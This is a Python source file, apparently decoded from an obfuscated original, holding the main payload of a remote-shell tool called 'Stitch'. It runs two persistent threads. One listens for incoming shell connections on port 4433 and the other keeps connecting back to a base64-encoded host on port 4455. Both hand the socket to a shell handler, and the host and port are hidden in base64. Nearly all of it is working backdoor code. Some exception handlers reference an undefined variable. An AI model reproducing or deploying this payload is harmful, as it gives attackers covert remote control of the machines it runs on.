#!/usr/bin/env python3
# Decoded from Configuration/st_main.py
# Original was obfuscated with exec(SEC(INFO(...)))

#!/usr/bin/env python
# TODO: Replace wildcard import with specific imports
# TODO: Replace wildcard import with specific imports
from st_utils import *

class stitch_payload():

    connected = False

    def bind_server(self):
        client_socket=None
        self.stop_bind_server = False
        # if no target is defined, we listen on all interfaces
        if dbg:
            print('creating server')
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        target = base64.b64decode("")
        port = int(base64.b64decode("NDQzMw=="))
        server.bind((target,port))
        server.listen(5)
        while True:
            if self.stop_bind_server:
                break
            server.settimeout(5)
            try:
                client_socket, addr = server.accept()
                server.settimeout(None)
                client_socket.settimeout(None)
            except Exception:
                if dbg:
                    print(e)
                client_socket=None
                pass
            if client_socket:
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\n")
                    client_socket.close()
            client_socket=None
        server.close()

    def halt_bind_server(self):
        self.stop_bind_server = True


    def listen_server(self):
        self.stop_listen_server  = False
        while True:
            if self.stop_listen_server :
                break
            while self.connected:
                sleep(5)
                pass
            if dbg:
                print('trying to connect')
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            client_socket.settimeout(5)
            target = base64.b64decode("bG9jYWxob3N0")
            port = int(base64.b64decode("NDQ1NQ=="))
            try:
                client_socket.connect((target,port))
                client_socket.settimeout(300)
                if not self.connected:
                    self.connected = True
                    client_handler(client_socket)
                    self.connected = False
                else:
                    send(client_socket,"[!] Another stitch shell has already been established.\n")
                    client_socket.close()
            except Exception:
                if dbg:
                    print(e)
                client_socket.close()

    def halt_listen_server(self):
        self.stop_listen_server = True


def main():
    if not stitch_running():
        st_pyld = stitch_payload()
        try:
            bind = threading.Thread(target=st_pyld.bind_server, args=())
            listen = threading.Thread(target=st_pyld.listen_server, args=())
            bind.daemon = True
            listen.daemon = True
            bind.start()
            listen.start()
    # TODO: Review - infinite loop may need exit condition
            while True:
                sleep(60)
        except KeyboardInterrupt:
            pass
        except Exception:
            if dbg:
                print(e)
            pass
        st_pyld.halt_bind_server()
        st_pyld.halt_listen_server()


if __name__ == '__main__':
    main()
